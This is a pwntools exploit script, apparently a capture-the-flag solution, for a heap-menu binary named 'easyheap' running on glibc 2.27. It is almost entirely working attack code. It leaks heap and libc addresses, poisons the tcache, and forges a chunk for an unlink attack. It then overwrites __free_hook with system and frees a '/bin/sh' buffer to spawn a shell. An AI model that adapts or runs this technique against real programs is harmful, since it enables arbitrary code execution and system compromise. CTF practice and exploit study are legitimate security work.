#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./easyheap')
libc = ELF('./libc-2.27.so')
elf = ELF('./easyheap')

def pr(a,addr):
	log.success(a+': '+hex(addr))

def add(idx,length):
	p.sendlineafter(':','1')
	p.sendlineafter('idx:',str(idx))
	p.sendlineafter('len:',str(length))

def delete(idx):
	p.sendlineafter(':','2')
	p.sendlineafter('idx:',str(idx))

def edit(idx,ct):
	p.sendlineafter(':','3')
	p.sendlineafter('idx:',str(idx))
	p.send(ct)

def show(idx):
	p.sendlineafter(':','4')
	p.sendlineafter('idx:',str(idx))

p.sendafter('Enter your favorite sentence :\n','1234')
p.sendlineafter('Enter your cookie :\n','287454020')
MysteriousXOR = int(p.recvline('\n'),16)
MysteriousXOR2 = int(p.recvline('\n'),16)

malloc_mmap = MysteriousXOR ^ 287454020
point_sentence_chunk = MysteriousXOR ^ MysteriousXOR2
node = point_sentence_chunk - 0x30
pr('malloc_mmap',malloc_mmap)
pr('point_sentence_chunk',point_sentence_chunk)
pr('node',node)

add(0,0x80) #0 0x290
add(1,0x80) #1 0x320
add(2,0x30) #2 0x3b0
add(3,0x48) #3 0x3f0 unlink目标
add(4,0x88) #4 0x440
add(5,0x30) #5 0x4d0

delete(1)
delete(0)

show(0)
heapbase = u64(p.recv(6).ljust(8, "\x00")) - 0x330
pr('heapbase',heapbase)

edit(0, p64(heapbase+0x440))
add(0,0x80) #chunk0
edit(0, p64(heapbase+0x440))
add(1,0x80) #分配去 chunk4 地址处

#填满tcachebin
for i in range(7):
	delete(0)
delete(0) #放入unsortedbin

show(0)
libcbase = u64(p.recv(6).ljust(8, "\x00")) - 0x3ebca0
free_hook = libcbase + libc.sym['__free_hook']
system = libcbase + libc.sym['system']
pr('libcbase',libcbase)
pr('free_hook',free_hook)
free_hook_1 = free_hook  &~ 0xfff 

#unlink
point_chunk3 = node + 0x18
target = point_chunk3
fd = target - 0x18
bk = target - 0x10
fake_chunk = p64(0) + p64(0x40)
fake_chunk += p64(fd) + p64(bk)
edit(3, fake_chunk)

edit(1, p64(0x40)+p64(0x90)) #修改chunk4 pre,inuse
# fake_chunk 与 chunk4 合并,unlink:chunk3 指针指向 point_chunk3 - 0x18 即为 node
delete(4) 

# chunk2 5 放入 tcache
delete(2)
delete(5)

edit(5, p64(free_hook))
add(5,0x30) #chunk5
edit(5, p64(free_hook))

#用指针chunk3 修改 point_sentence_chunk 值绕过检查
payload = p64(heapbase+0x2a0) + p64(heapbase+0x440)
payload += p64(heapbase+0x3c0) + p64(node)
payload += p64(heapbase+0x450) + p64(heapbase+0x4e0)
payload += p64(free_hook_1+0x250)
edit(3, payload)

#分配去 free_hook 写入 system
add(2,0x30)
edit(2, p64(system))

edit(0, '/bin/sh')
#gdb.attach(p)
#pause()

delete(0)
p.interactive()
